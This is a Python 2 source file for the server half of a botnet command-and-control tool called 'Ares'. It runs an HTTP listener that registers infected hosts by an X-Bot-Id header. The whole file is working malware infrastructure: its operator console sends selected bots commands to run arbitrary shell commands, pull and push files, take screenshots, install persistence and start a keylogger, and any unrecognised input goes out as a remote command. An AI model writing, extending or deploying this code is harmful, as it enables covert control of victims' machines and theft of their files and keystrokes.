from BaseHTTPServer import HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from threading import Thread
import time
import Queue
from modules import runcmd, download, screenshot, upload, persistence, keylogger


online_bots = {}
selected_bots = []


def refresh_bots():
    while True:
        time.sleep(10)
        to_remove = []
        for bot in online_bots:
            if time.time() - online_bots[bot]["last online"] > 60:
                to_remove.append(bot)
        for bot in to_remove:
            print "[!] Bot disconnected: %s" % bot
            if bot in selected_bots:
                selected_bots.remove(bot)
            del online_bots[bot] 


class RequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        """ Returns work for the bot """
        origin = self.headers.getheader('X-Bot-Id')
        if origin not in online_bots:
            online_bots[origin] = {}
            online_bots[origin]["in"] = Queue.Queue()
            online_bots[origin]["out"] = Queue.Queue()
            print "[*] Bot connected: %s" % origin
        self.keepalive(online_bots[origin])
        self.send_response(200)
        self.end_headers()
        if not online_bots[origin]["out"].empty():
            self.wfile.write(online_bots[origin]["out"].get())

    def do_POST(self):
        """ Process bot output and give some other work to do """
        origin = self.headers.getheader('X-Bot-Id')
        self.keepalive(online_bots[origin])
        content_len = int(self.headers.getheader('content-length', 0))
        message = self.rfile.read(content_len)
        online_bots[origin]["in"].put(message)
        response = online_bots[origin]["out"].get()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(response)


    def log_message(self, format, *args):
        return

    def keepalive(self, bot):
        bot["last online"] = time.time()


class Commander(Thread):
    def __init__(self, ip, port):
        Thread.__init__(self)
        self.daemon = True
        self.LISTEN_IP = ip
        self.LISTEN_PORT = port

    def run(self):
        HTTPServer((self.LISTEN_IP, self.LISTEN_PORT), RequestHandler).serve_forever()


commander = Commander('0.0.0.0', 8000)
commander.start()
refresher = Thread(target=refresh_bots)
refresher.setDaemon(True)
refresher.start()


while 1:
    print """
    Welcome to Ares command and control !

    Available commands:

    - hosts
        Lists available hosts
    - select <host1> <host2> <host3> | show
        Selects one ore more hosts to perform actions on
        or shows current selection
    - run <cmd>
        Runs a command on remote host
    - download <file path>
        Downloads file from remote host
    - upload <file path>
        Uploads file to remote host
    - screenshot
        Takes a screenshot of remote host
    - persistence install|remove|status
        Manages persistence of the bot agent
    - keylogger start|show
        Starts the keylogger, and show captured keys
    - quit
        Exit Ares server

    """
    cmd_line = raw_input("> ")
    cmd = cmd_line.split(" ")[0]
    args = cmd_line .split(" ")[1:]
    if cmd == "hosts":
        for bot in online_bots:
            print "HOST LIST"
            print "  - %s -- Last Online: %s" % (bot, time.ctime(online_bots[bot]["last online"]))
            print
    elif cmd == "select":
        if not args or args[0] != "show":
            for arg in args:
                if arg in online_bots:
                    selected_bots.append(arg)
                else:
                    print "Unkown bot: %s" % arg
            print "selected:", selected_bots
    elif cmd == "run":
        for bot in selected_bots:
            runcmd.run(online_bots[bot], " ".join(args))
    elif cmd == "download":
        for bot in selected_bots:
            download.run(online_bots[bot], args[0])
    elif cmd == "upload":
        for bot in selected_bots:
            upload.run(online_bots[bot], args[0])
    elif cmd == "screenshot":
        for bot in selected_bots:
            screenshot.run(online_bots[bot])
    elif cmd == "persistence":
        for bot in selected_bots:
            persistence.run(online_bots[bot], args[0])
    elif cmd == "keylogger":
        for bot in selected_bots:
            keylogger.run(online_bots[bot], args[0])
    elif cmd == "quit":
        quit()
    else:
        for bot in selected_bots:
            runcmd.run(online_bots[bot], cmd + " " + " ".join(args))
